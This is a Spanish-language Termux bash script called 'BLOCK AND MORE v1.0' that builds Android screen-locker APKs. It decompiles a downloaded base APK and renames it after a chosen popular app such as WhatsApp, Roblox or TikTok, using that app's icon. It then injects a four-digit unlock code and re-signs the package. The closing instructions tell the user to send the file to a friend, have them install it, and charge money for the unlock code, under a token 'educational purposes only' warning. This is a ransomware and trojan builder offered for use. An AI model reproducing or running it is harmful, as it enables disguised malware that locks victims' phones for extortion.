#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK AND MORE v1.0 ]${NC}\n"

# ============================================
# LISTA DE APPS DISPONIBLES
# ============================================
APPS=(
    "Roblox"
    "Free Fire"
    "TikTok"
    "Instagram"
    "Facebook"
    "WhatsApp"
    "YouTube"
    "Minecraft"
    "PUBG Mobile"
    "Clash of Clans"
    "Spotify"
    "Netflix"
    "Discord"
    "Snapchat"
    "Twitter"
    "Telegram"
)

# ============================================
# FUNCIÓN PARA MOSTRAR MENÚ PRINCIPAL
# ============================================
mostrar_menu_principal() {
    echo -e "${BLANCO}[+] Selecciona una app:${NC}\n"
    
    # Mostrar apps en columnas de 4
    for i in "${!APPS[@]}"; do
        num=$((i+1))
        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-12s${NC}" "$num" "${APPS[$i]}"
        if [ $((num % 4)) -eq 0 ]; then
            echo ""
        fi
    done
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# FUNCIÓN PARA MOSTRAR SUBMENÚ (OPCIONES)
# ============================================
mostrar_submenu() {
    local app="$1"
    clear
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${VERDE}[✔] App seleccionada: ${BLANCO}$app${NC}"
    echo -e "${CYAN}==================================================${NC}\n"
    echo -e "${BLANCO}[+] Opciones disponibles:${NC}"
    echo -e "  ${AMARILLO}[1]${NC} ${VERDE}BLOCK${NC} - Generar APK de bloqueo para $app"
    echo -e "  ${AMARILLO}[2]${NC} ${ROJO}Volver al menú principal${NC}"
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# FUNCIÓN PARA GENERAR APK DE BLOQUEO
# ============================================
generar_block() {
    local app="$1"
    local codigo="$2"
    
    echo -e "${VERDE}[✔] Generando APK de bloqueo para: ${BLANCO}$app${NC}"
    echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}\n"
    
    # Preparar directorios
    mkdir -p ~/block_phone_temp
    mkdir -p ~/storage/downloads
    cd ~/block_phone_temp
    
    # Descargar APK base
    echo -e "${AMARILLO}[*] Descargando APK base...${NC}"
    BASE_APK_URL="https://www.dropbox.com/s/ejemplo/block_base.apk?dl=1"
    
    wget -O base.apk "$BASE_APK_URL" 2>/dev/null
    
    if [ ! -f "base.apk" ]; then
        echo -e "${ROJO}[!] Error al descargar la APK base.${NC}"
        echo -e "${AMARILLO}[!] Coloca manualmente una APK base en:${NC}"
        echo -e "${AMARILLO}    ~/block_phone_temp/base.apk${NC}"
        echo -e "${BLANCO}[*] Luego presiona Enter para continuar...${NC}"
        read
    fi
    
    # Decompilar
    echo -e "${AMARILLO}[*] Decompilando APK...${NC}"
    pkg install apktool -y > /dev/null 2>&1
    apktool d base.apk -o decoded > /dev/null 2>&1
    
    if [ ! -d "decoded" ]; then
        echo -e "${ROJO}[!] Error al decompilar.${NC}"
        exit 1
    fi
    
    # Personalizar nombre e icono
    echo -e "${AMARILLO}[*] Personalizando APK para: ${VERDE}$app${NC}"
    
    # Cambiar nombre en AndroidManifest.xml
    find decoded -name "AndroidManifest.xml" -exec sed -i 's/BlockPhone/'"$app"'/g' {} \;
    find decoded -name "AndroidManifest.xml" -exec sed -i 's/Block Phone/'"$app"'/g' {} \;
    
    # Descargar icono
    ICON_URL="https://img.icons8.com/color/96/000000/$app.png"
    wget -O icon.png "$ICON_URL" 2>/dev/null
    
    if [ ! -f "icon.png" ]; then
        ICON_URL="https://img.icons8.com/color/96/000000/android-os.png"
        wget -O icon.png "$ICON_URL" 2>/dev/null
    fi
    
    # Copiar icono
    find decoded -type d -name "drawable*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
    find decoded -type d -name "mipmap*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
    
    # Inyectar código de desbloqueo
    echo -e "${AMARILLO}[*] Inyectando código: ${VERDE}$codigo${NC}"
    
    STRING_FILE=$(find decoded -name "strings.xml" | head -1)
    if [ -f "$STRING_FILE" ]; then
        sed -i 's/CODIGO_DESBLOQUEO/'"$codigo"'/g' "$STRING_FILE"
        sed -i 's/HAS SIDO HACKEADO/🔒 DISPOSITIVO BLOQUEADO/g' "$STRING_FILE"
        sed -i 's/TU DISPOSITIVO ESTÁ BLOQUEADO/⚠️ CONTACTA AL PROPIETARIO ⚠️/g' "$STRING_FILE"
        sed -i 's/Ingresa el código de desbloqueo/INGRESA EL CÓDIGO DE 4 DÍGITOS/g' "$STRING_FILE"
        sed -i 's/Código incorrecto/CÓDIGO INCORRECTO/g' "$STRING_FILE"
    fi
    
    # Recompilar y firmar
    echo -e "${AMARILLO}[*] Recompilando APK...${NC}"
    apktool b decoded -o final.apk > /dev/null 2>&1
    
    echo -e "${AMARILLO}[*] Firmando APK...${NC}"
    pkg install apksigner -y > /dev/null 2>&1
    
    if [ ! -f "debug.keystore" ]; then
        keytool -genkey -v -keystore debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android > /dev/null 2>&1
    fi
    
    apksigner sign --keystore debug.keystore --storepass android --keypass android --out "${app}_block.apk" final.apk 2>/dev/null
    
    if [ ! -f "${app}_block.apk" ]; then
        cp final.apk "${app}_block.apk"
    fi
    
    # Mover a descargas
    mv "${app}_block.apk" ~/storage/downloads/
    cd ~
    rm -rf ~/block_phone_temp
    
    # Mostrar mensaje final
    clear
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
    echo -e "${CYAN}==================================================${NC}\n"
    echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
    echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
    echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
    echo -e "\n${ROJO}⚠️  INSTRUCCIONES:${NC}"
    echo -e "  1. Envía el archivo a tu amigo."
    echo -e "  2. Dile que instale la APK."
    echo -e "  3. Para desbloquear debe ingresar: ${VERDE}$codigo${NC}"
    echo -e "  4. Si se equivoca, espera 1 minuto (se acumula)."
    echo -e "  5. 💰 Cobra por el código antes de dárselo."
    echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos."
    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    
    read -p "Presiona Enter para volver al menú principal..."
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    clear
    echo -e "${CYAN}"
    echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
    echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
    echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
    echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
    echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
    echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
    echo -e "${AMARILLO}        [ BLOCK AND MORE v1.0 ]${NC}\n"
    
    mostrar_menu_principal
    read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
    
    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
        APP_SELECCIONADA="${APPS[$((opcion-1))]}"
        
        # SUBMENÚ
        while true; do
            mostrar_submenu "$APP_SELECCIONADA"
            read -p ">> Selecciona una opción (1-2): " subopcion < /dev/tty
            
            if [ "$subopcion" == "1" ]; then
                # Generar BLOCK - Pedir código
                echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
                while true; do
                    read -p ">> Código (1000-9999): " CODIGO < /dev/tty
                    if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                        break
                    else
                        echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
                    fi
                done
                
                generar_block "$APP_SELECCIONADA" "$CODIGO"
                break
            elif [ "$subopcion" == "2" ]; then
                break
            else
                echo -e "${ROJO}[!] Opción inválida.${NC}"
                sleep 1
            fi
        done
    else
        echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
        sleep 2
    fi
done
